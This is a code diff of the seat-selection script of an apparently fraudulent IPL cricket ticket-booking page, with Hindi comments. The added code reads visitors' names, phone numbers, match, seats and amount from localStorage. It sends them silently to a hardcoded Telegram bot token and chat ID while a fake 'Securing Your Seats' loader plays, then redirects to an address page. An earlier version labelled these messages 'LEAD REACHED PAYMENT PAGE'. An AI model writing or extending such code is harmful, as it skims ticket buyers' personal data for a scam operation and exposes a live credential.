@@ -351,7 +351,7 @@
             localStorage.setItem("seatQuantity", window.sQty);
         }
 
-        window.goNext = () => { 
+                window.goNext = () => { 
             if (window.sPrice > 0) {
                 
                 const btn = document.getElementById('final-btn');
@@ -365,58 +365,57 @@
                     <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.95); z-index:99999; display:flex; flex-direction:column; justify-content:center; align-items:center; backdrop-filter:blur(5px);">
                         <div style="width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #00cf7f; border-radius: 50%; animation: load-spin 1s linear infinite;"></div>
                         <h3 style="margin-top:20px; color:#333; font-family:sans-serif; font-size:18px; font-weight:700;">Securing Your Seats...</h3>
-                        <p style="color:#666; font-size:13px; margin-top:5px; font-weight:500;">Please wait, redirecting to gateway</p>
+                        <p style="color:#666; font-size:13px; margin-top:5px; font-weight:500;">Please wait, redirecting...</p>
                         <style>@keyframes load-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
                     </div>
                 `;
                 document.body.appendChild(loader);
 
-                const name = localStorage.getItem('customerName') || "Unknown";
-                const phone = localStorage.getItem('customerPhone') || "Unknown";
-                const matchTitle = document.getElementById('match-title').innerText || "IPL Match";
+                // 🔥 1. सीट्स की डिटेल सेव करना 🔥
                 const seatType = document.getElementById('res-type').innerText;
-                const totalAmt = window.sQty * window.sPrice;
+                const seatsInfo = `${window.sQty} x ${seatType}`;
+                localStorage.setItem("selectedSeats", seatsInfo); // ये Address और Payment पेज के लिए सेव हो गया
 
+                // 🔥 2. पुरानी डिटेल्स निकालना 🔥
+                const name = localStorage.getItem('customerName') || "Not Provided";
+                const phone = localStorage.getItem('customerPhone') || "Not Provided";
+                const finalPrice = localStorage.getItem('finalPrice') || "0";
+                
+                let matchTitle = "Not Selected";
+                try {
+                    const matchData = JSON.parse(localStorage.getItem('selectedMatch'));
+                    if(matchData) matchTitle = matchData.title || "Not Selected";
+                } catch(e) {}
+
+                // 🔥 3. हिंदी टेलीग्राम मैसेज 🔥
                 const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
                 const chatId = "6820660513"; 
                 
-                const telegramMsg = `💰 LEAD REACHED PAYMENT PAGE! 💰\n\n👤 Name: ${name}\n📞 WhatsApp: ${phone}\n🏏 Match: ${matchTitle}\n🎟️ Seats: ${window.sQty} x ${seatType}\n💵 Total Amount: ₹${totalAmt}`;
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}`;
+                const telegramMsg = `🪑 *कस्टमर ने सीट्स सेलेक्ट कर ली हैं! (Seats Page)* 🪑\n\n` +
+                                    `👤 *नाम (Name):* ${name}\n` +
+                                    `📞 *नंबर (Phone):* ${phone}\n` +
+                                    `🏏 *मैच (Match):* ${matchTitle}\n` +
+                                    `🎟️ *सीट्स (Seats):* ${seatsInfo}\n` +
+                                    `💰 *अमाउंट (Amount):* ₹${finalPrice}\n\n` +
+                                    `👉 *स्टेटस:* अब कस्टमर Address (Details) पेज पर जा रहा है!`;
+                                    
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;
 
+                // मैसेज सेंड करो और फिर Address पेज पर भेजो
+                // (अगर आपके एड्रेस वाले पेज का नाम कुछ और है जैसे details.html तो नीचे "address.html" बदल लेना)
                 fetch(url).then(() => {
-                    window.location.href = "details.html";
+                    window.location.href = "address.html"; 
                 }).catch(() => {
-                    window.location.href = "details.html";
+                    window.location.href = "address.html";
                 });
 
+                // Fail-safe (अगर नेट स्लो हो तो 1.2 सेकंड बाद अपने आप चला जाये)
                 setTimeout(() => {
-                    window.location.href = "details.html";
+                    window.location.href = "address.html";
                 }, 1200);
 
             } else {
-                alert("Kripya pehle seat type select karein!");
+                alert("Please select a seat category first!");
             }
         };
-    </script>
-
-    <script type="module">
-        import { db, ref, onValue } from './js/firebase.js';
         
-        onValue(ref(db, 'settings/payment'), (snap) => {
-            if (snap.exists()) {
-                const settings = snap.val();
-                const globalFooterLogo = settings.globalFooterLogo || '';
-                const footerLogoImg = document.getElementById('dynamic-footer-logo');
-                if (footerLogoImg && globalFooterLogo.trim() !== "") {
-                    footerLogoImg.src = globalFooterLogo;
-                    footerLogoImg.style.display = 'block';
-                }
-            }
-        });
-    </script>
-
-    <script type="module" src="js/seats.js"></script>
-
-</body>
-</html>
-
